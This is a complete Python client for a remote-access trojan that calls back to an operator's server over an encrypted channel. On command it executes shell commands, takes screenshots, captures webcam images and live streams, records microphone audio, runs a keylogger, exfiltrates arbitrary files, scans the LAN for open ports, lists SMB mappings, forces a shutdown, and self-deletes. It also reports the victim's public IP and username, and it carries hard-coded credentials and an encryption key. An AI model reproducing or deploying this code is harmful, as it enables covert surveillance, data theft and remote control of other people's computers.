#!/usr/bin/env python3
from __future__ import annotations
from PIL import Image
from cryptography.fernet import Fernet, InvalidToken
from mss import mss
from contextlib import closing
import cv2
import getpass
import io
import ipaddress
import json
import numpy as np
import os
import platform
import psutil
import re
import socket
import sounddevice as sd
import struct
import subprocess
import sys
import threading
import time
import wave

SERVER_PORT = 613
# client will retry connecting after this many seconds
RETRY = 5
AUTH_CMD, SHELL_OUT = 254, 0
USERNAME, PASSWORD = "exampleuser", "S3cr3t!password"
# Maximum ciphertext length (in bytes) to prevent abuse. Default is 100 MB.
MAX_CIPHER = 104_857_600

# Key for Fernet encryption/decryption -> See
# helpers-encryption-and-auth/generate-fernet-key.py for how to generate your
# own. Must be 32 url-safe base64-encoded bytes.
SECRET_KEY = b"XRj8tFGZfTsfEMOBsgwzMmlpZw10eXMVL8yxsPmHYxQ="

# Command IDs
#
SHELL_CMD      = 1
BIN_OUT        = 2
STREAM_FRAME   = 3
SCREENSHOT_CMD = 4
WEBCAM_CMD     = 5  # capture webcam image
AUDIO_CMD      = 6  
KEYLOG_CMD     = 7  # toggle keylogger
SHUTDOWN_CMD   = 8
RESTART_CMD    = 9
STREAM_CMD     = 10 # toggle webcam stream
LAN_SCAN_CMD   = 11 # scan local network
LAN_SCAN_OUT   = 12 # scan results (text)
SMBMAP_CMD     = 13 # Windows-only
GET_FILE_CMD   = 14
PIANO_CMD      = 15 # piano mode toggle
PIANO_NOTE_CMD = 16 # play specific note
DEATH_CMD      = 99 # self-delete remote client

f = Fernet(SECRET_KEY)

def _send_jpeg(sock, jpg_bytes: bytes, frame_id: int):
    meta = json.dumps({"frame": frame_id}).encode() + b'\n'
    _send_enc(sock, STREAM_FRAME, meta + jpg_bytes)

_stream_on     = False
_stream_thread = None

def _stream_worker(sock):
    cap = cv2.VideoCapture(0, cv2.CAP_ANY)
    if not cap.isOpened():
        _send_enc(sock, SHELL_OUT, b"[stream] webcam not available")
        return
    frame_id = 0
    try:
        while _stream_on:
            ret, frame = cap.read()
            if not ret:
                break
            # Encode as medium-quality JPEG
            ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            if not ok:
                break
            _send_jpeg(sock, buf.tobytes(), frame_id)
            frame_id += 1
            time.sleep(0.5)
    finally:
        cap.release()

def _send_bin(sock, kind: str, ext: str, data: bytes, name: str | None = None):
    meta = {"kind": kind, "ext": ext}
    if name:
        meta["name"] = name
    hdr = json.dumps(meta).encode() + b'\n'
    _send_enc(sock, BIN_OUT, hdr + data)

def _toggle_stream(sock):
    global _stream_on, _stream_thread
    if not _stream_on:                        # START
        _stream_on = True
        _stream_thread = threading.Thread(target=_stream_worker,
                                          args=(sock,), daemon=True)
        _stream_thread.start()
        _send_enc(sock, SHELL_OUT, b"[stream] started")
    else:                                     # STOP
        _stream_on = False
        if _stream_thread:
            _stream_thread.join(timeout=1)
        _send_enc(sock, SHELL_OUT, b"[stream] stopped")

def _delayed_exec(cmd_list, action_name):
    ''' Spawn a 1-second-delayed subprocess so we can ACK first. '''

    def _worker():
        time.sleep(1)
        try:
            subprocess.run(cmd_list, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        except Exception:
            pass                                           # ignore failures

    threading.Thread(target=_worker, daemon=True).start()
    return f"{action_name} requested ({' '.join(cmd_list)})"

def _capture_screenshot() -> bytes:
    with mss() as sct:
        monitor = sct.monitors[0]
        img = Image.frombytes("RGB", (monitor["width"], monitor["height"]),
                              sct.grab(monitor).rgb)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()

def _capture_webcam() -> bytes:
    cap = cv2.VideoCapture(0, cv2.CAP_ANY)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        raise RuntimeError("webcam not available")
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    img   = Image.fromarray(frame)
    buf   = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()

def _record_audio(duration=5, fs=44100) -> bytes:
    audio = sd.rec(int(duration*fs), samplerate=fs, channels=1, dtype="int16")
    sd.wait()
    buf = io.BytesIO()
    with wave.open(buf, "wb") as wf:
        wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(fs)
        wf.writeframes(audio.tobytes())
    return buf.getvalue()

_keylog_active = False
_keylog_buf    = []
_keylog_thread = None

def _toggle_keylogger(sock):
    """
    First call → start key-logger.
    Second call → stop it and send captured keys back.

    If pynput fails to load (e.g. no X server), return a one-line
    error message instead of crashing the whole client.
    """
    global _keylog_active, _keylog_thread

    if not _keylog_active:
        try:
            from pynput import keyboard
        except Exception as e:
            msg = f"[keylog] unavailable: {e}"
            _send_enc(sock, SHELL_OUT, msg.encode())
            print(msg)
            return

        _keylog_active = True

        def _worker():
            def on_press(key):
                try:
                    _keylog_buf.append(key.char)
                except AttributeError:
                    _keylog_buf.append(f"<{key.name}>")

            with keyboard.Listener(on_press=on_press) as listener:
                while _keylog_active:
                    time.sleep(0.1)        # keep thread alive
                listener.stop()

        _keylog_thread = threading.Thread(target=_worker, daemon=True)
        _keylog_thread.start()
        _send_enc(sock, SHELL_OUT, b"[keylog] started")

    else:                                           # ── STOP ──
        _keylog_active = False
        if _keylog_thread:
            _keylog_thread.join(timeout=1)
        data = "".join(_keylog_buf).encode()
        _keylog_buf.clear()
        _send_enc(sock, SHELL_OUT, data if data else b"[keylog] (no data)")
        _keylog_thread = None
        _send_enc(sock, SHELL_OUT, b"[keylog] stopped")

# NOTE: deprecated (and mildly useless)
def _gateway(): 
    try:
        if platform.system()=="Windows":
            txt = subprocess.check_output("ipconfig", text=True, errors="ignore")
            m = re.search(r"Default Gateway[ .:]+([\d.]+)", txt);  return m.group(1) if m else "?"
        txt = subprocess.check_output("ip route show default", shell=True, text=True)
        return txt.split()[2]
    except Exception:  return "?"

def _public_ip(timeout=3) -> str:
    """
    Ask a public service for the outward-facing IP.
    Returns '?' on any failure.
    """
    try:
        import urllib.request, json
        with urllib.request.urlopen("https://api.ipify.org?format=json",
                                    timeout=timeout) as resp:
            data = json.load(resp)
            return data.get("ip", "?")
    except Exception:
        return "?"

META = {
    "os":        platform.system(),
    "public_ip": _public_ip(),
    "sysuser":   getpass.getuser(),
    "auth_user": USERNAME,
}

def _send_enc(sock: socket.socket, cmd: int, payload: bytes | None = None):
    """Encrypt & frame:  uint32(len) ‖ Fernet(ciphertext)."""
    if payload is None:
        payload = b''                       # never concatenate None
    blob   = struct.pack(">BI", cmd, len(payload)) + payload
    token  = f.encrypt(blob)                # AES-CTR + HMAC
    sock.sendall(struct.pack(">I", len(token)) + token)

def _read_exact(sock: socket.socket, n: int) -> bytes:
    """Read exactly *n* bytes or raise ConnectionResetError."""
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:                       # peer closed the socket
            raise ConnectionResetError("connection closed while reading")
        buf += chunk
    return buf

def _recv_enc(sock: socket.socket):
    clen_bytes = _read_exact(sock, 4)
    (clen,)    = struct.unpack(">I", clen_bytes)

    if clen > MAX_CIPHER:       # ← was 64 000
        raise ValueError("ciphertext length absurd")

    token  = _read_exact(sock, clen)
    plain  = f.decrypt(token)   # may raise InvalidToken
    cmd, plen = struct.unpack(">BI", plain[:5])
    payload   = plain[5:5 + plen]
    return cmd, payload

def _read(sock,n):
    buf=b''
    while len(buf)<n: part=sock.recv(n-len(buf));  buf+=part or b''
    if not buf: raise ConnectionResetError; return buf

def _exec_shell(cmd:str)->str:
    try:
        p=subprocess.run(cmd,shell=True,capture_output=True,text=True,check=False)
        out=p.stdout+p.stderr;  return out if out else "(no output)"
    except Exception as e: return f"[error] {e}"

def _primary_subnet() -> ipaddress.IPv4Network | None:
    preferred = None
    fallback  = None
    for nic, addrs in psutil.net_if_addrs().items():
        for af in addrs:
            if af.family is socket.AF_INET and not af.address.startswith("127."):
                ip = ipaddress.IPv4Address(af.address)
                if ip.is_link_local:
                    if not fallback:
                        fallback = ip
                    continue
                if ip.is_private and not preferred:
                    preferred = ip
                elif not preferred and not fallback:
                    fallback = ip
    sel = preferred or fallback
    return ipaddress.IPv4Network(f"{sel}/24", strict=False) if sel else None

def _ping_ok(ip_str: str) -> bool:
    if platform.system() == "Windows":
        cmd = ["ping", "-n", "1", "-w", "250", ip_str]
    else:
        cmd = ["ping", "-c", "1", "-W", "1", ip_str]
    return subprocess.call(cmd, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL) == 0

def _tcp_probe(ip_str: str, port: int, timeout=0.2) -> bool:
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        s.settimeout(timeout)
        return s.connect_ex((ip_str, port)) == 0

def _arp_table() -> dict[str, str]:
    """Return {ip: mac} from OS ARP cache (best-effort)."""
    macs = {}
    if platform.system() == "Windows":
        out = subprocess.check_output("arp -a", text=True, encoding="utf-8")
        for line in out.splitlines():
            if "-" in line and "." in line:
                ip, mac, _ = line.split()[:3]
                macs[ip] = mac
    else:
        out = subprocess.check_output("arp -n", shell=True, text=True)
        for line in out.splitlines():
            tok = line.split()
            if len(tok) >= 3 and tok[0][0].isdigit() and ":" in tok[2]:
                macs[tok[0]] = tok[2]
    return macs

def _scan_lan() -> str:
    net = _primary_subnet()
    if not net:
        return "[scan] no suitable interface found"

    # commonly vulnerable ports
    ports = [
        22,                  # SSH
        53,                  # DNS
        80, 443,             # HTTP/S
        137, 138, 139, 445,  # NetBIOS / SMB
        1900, 5353,          # SSDP / mDNS  → phones & smart-TVs
        8008, 8009,          # Chromecast
        8080                 # alt-HTTP
    ]

    live = []
    print(f"_scan_lan: network interface: {net}")
    print(f"_scan_lan: starting for loop")
    for host in net.hosts():
        ip_str = str(host)
        print(f"_scan_lan: {ip_str}")

        alive = _ping_ok(ip_str) or _tcp_probe(ip_str, 80)
        if not alive:
            continue

        try:
            hostname = socket.gethostbyaddr(ip_str)[0]
        except Exception:
            hostname = "-"

        open_ports = [str(p) for p in ports if _tcp_probe(ip_str, p)]
        live.append((ip_str, hostname, ",".join(open_ports)))

    # Merge in MAC addresses after the sweep
    mac_map = _arp_table()
    rows = []
    for ip_str, hn, portlist in live:
        mac = mac_map.get(ip_str, "-")
        rows.append((ip_str, hn, mac, portlist))

    if not rows:
        return f"[scan] {net} — no live hosts"

    # assemble table
    header = ("IP", "Hostname", "MAC", "Ports")
    widths = [max(len(r[i]) for r in [header]+rows) for i in range(4)]
    lines  = ["  ".join(h.ljust(w) for h, w in zip(header, widths)),
              "  ".join("-"*w for w in widths)]
    for r in rows:
        lines.append("  ".join(col.ljust(w) for col, w in zip(r, widths)))
    return "\n".join(lines)

def _play_note(frequency: float, duration: float = 0.5):
    """
    Play a musical note at the given frequency for the specified duration.
    """
    try:
        import numpy as np
        import sounddevice as sd
        
        sample_rate = 44100
        t = np.linspace(0, duration, int(sample_rate * duration), False)
        # Generate a simple sine wave
        wave = np.sin(2 * np.pi * frequency * t)
        # Add some envelope to avoid clicks
        envelope = np.exp(-t * 2)
        wave = wave * envelope * 0.3  # Reduce volume
        
        sd.play(wave, sample_rate)
        sd.wait()
    except Exception as e:
        print(f"[piano] error playing note: {e}")

# Musical note frequencies (4th octave)
NOTE_FREQUENCIES = {
    'c': 261.63,   # C4
    'c#': 277.18,  # C#4
    'd': 293.66,   # D4
    'd#': 311.13,  # D#4
    'e': 329.63,   # E4
    'f': 349.23,   # F4
    'f#': 369.99,  # F#4
    'g': 392.00,   # G4
    'g#': 415.30,  # G#4
    'a': 440.00,   # A4
    'a#': 466.16,  # A#4
    'b': 493.88,   # B4
}

_piano_active = False

def _toggle_piano_mode(sock):
    """Toggle piano mode on/off."""
    global _piano_active
    _piano_active = not _piano_active
    
    if _piano_active:
        _send_enc(sock, SHELL_OUT, b"[piano] mode activated - server can now play notes")
        instructions = (
            "[piano] Key mappings:\n"
            "  a s d f g h j k l ; '  (white keys: C D E F G A B)\n"
            "  w e   t y u   o p      (black keys: C# D# F# G# A#)\n"
            "  Press 'q' to exit piano mode"
        )
        _send_enc(sock, SHELL_OUT, instructions.encode())
    else:
        _send_enc(sock, SHELL_OUT, b"[piano] mode deactivated")

def _play_piano_note(sock, note_data: str):
    """Play a specific musical note."""
    if not _piano_active:
        _send_enc(sock, SHELL_OUT, b"[piano] not in piano mode")
        return
    
    try:
        note = note_data.strip().lower()
        if note in NOTE_FREQUENCIES:
            frequency = NOTE_FREQUENCIES[note]
            # Play note in a separate thread to avoid blocking
            threading.Thread(target=_play_note, args=(frequency,), daemon=True).start()
        else:
            _send_enc(sock, SHELL_OUT, f"[piano] unknown note: {note}".encode())
    except Exception as e:
        _send_enc(sock, SHELL_OUT, f"[piano] error: {e}".encode())

def run(server_ip:str):
    while True:
        try:
            with socket.socket() as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE,1)
                s.connect((server_ip, SERVER_PORT))
                # authenticate
                auth = json.dumps({"username":USERNAME,"password":PASSWORD,"meta":META}).encode()
                _send_enc(s, AUTH_CMD, auth)
                print(f"[+] connected to {server_ip}:{SERVER_PORT} as {USERNAME}")

                while True:
                    cmd,pl = _recv_enc(s)

                    if cmd == SHELL_CMD:
                        _send_enc(s, SHELL_OUT, _exec_shell(pl.decode()).encode())

                    elif cmd == LAN_SCAN_CMD:
                        _send_enc(s, LAN_SCAN_OUT, _scan_lan().encode())

                    elif cmd == SCREENSHOT_CMD:
                        img = _capture_screenshot()
                        _send_bin(s, "screenshot", "png", img)

                    elif cmd == STREAM_CMD:
                        _toggle_stream(s)

                    elif cmd == WEBCAM_CMD:
                        img = _capture_webcam()
                        _send_bin(s, "webcam", "png", img)

                    elif cmd == AUDIO_CMD:
                        # Payload optionally contains the desired duration in seconds, e.g. `"10"`
                        try:
                            dur = int(pl.decode()) if pl else 5
                            if dur <= 0:
                                raise ValueError
                        except ValueError:
                            _send_enc(s, SHELL_OUT, b"[audio] invalid duration; using 5 s")
                            dur = 5

                        wav = _record_audio(duration=dur)
                        _send_bin(s, "audio", "wav", wav)

                    elif cmd == KEYLOG_CMD:
                        _toggle_keylogger(s)

                    elif cmd == GET_FILE_CMD:
                        path = pl.decode().strip()
                        try:
                            with open(path, "rb") as fp:
                                blob = fp.read()
                            name = os.path.basename(path)
                            ext  = os.path.splitext(name)[1].lstrip(".") or "bin"
                            _send_bin(s, "file", ext, blob, name)
                        except Exception as e:
                            msg = f"[get] error opening {path!r}: {e}"
                            _send_enc(s, SHELL_OUT, msg.encode())

                    elif cmd == SMBMAP_CMD:
                        if platform.system() == "Windows":
                            ps_cmd = [
                                "powershell", "-NoProfile", "-Command",
                                "Get-SmbMapping | "
                                "Select-Object RemotePath, LocalPath, UserName, Status | "
                                "Format-Table -AutoSize"
                            ]
                            try:
                                out = subprocess.check_output(ps_cmd, text=True, encoding="utf-8",
                                                            stderr=subprocess.STDOUT)
                            except subprocess.CalledProcessError as e:
                                out = f"[smbmap] error: {e.output}"
                        else:
                            out = "[smbmap] this command isn’t supported on the client"

                        _send_enc(s, SHELL_OUT, out.encode())

                    elif cmd == SHUTDOWN_CMD:
                        if platform.system() == "Windows":
                            msg = _delayed_exec(["shutdown", "/s", "/t", "0", "/f"], "Shutdown")
                        else:
                            msg = _delayed_exec(["shutdown", "-h", "now"], "Shutdown")

                        _send_enc(s, SHELL_OUT, msg.encode())

                    elif cmd == RESTART_CMD:
                        if platform.system() == "Windows":
                            msg = _delayed_exec(["shutdown", "/r", "/t", "0", "/f"], "Restart")
                        else:
                            msg = _delayed_exec(["reboot"], "Restart")

                        _send_enc(s, SHELL_OUT, msg.encode())

                    elif cmd == PIANO_CMD:
                        _toggle_piano_mode(s)

                    elif cmd == PIANO_NOTE_CMD:
                        _play_piano_note(s, pl.decode())

                    elif cmd == DEATH_CMD:
                        try:
                            os.remove(sys.argv[0])
                            msg = "[death] success"
                        except OSError as e:
                            msg = f"[death] failed to self-delete: {e}"
                        print(msg)
                        _send_enc(s, SHELL_OUT, msg.encode())
                        sys.exit(0)

        except (InvalidToken, ValueError) as e:
            print(f"[!] encryption/auth failure: {e} – aborting")
            time.sleep(60)
        except Exception as e:
            print(f"[!] {e} - retry in {RETRY}s")
            time.sleep(RETRY)

if __name__ == "__main__":
    if len(sys.argv)!=2:
        print("usage: python client.py <server-ip>"); sys.exit(1)
    run(sys.argv[1])
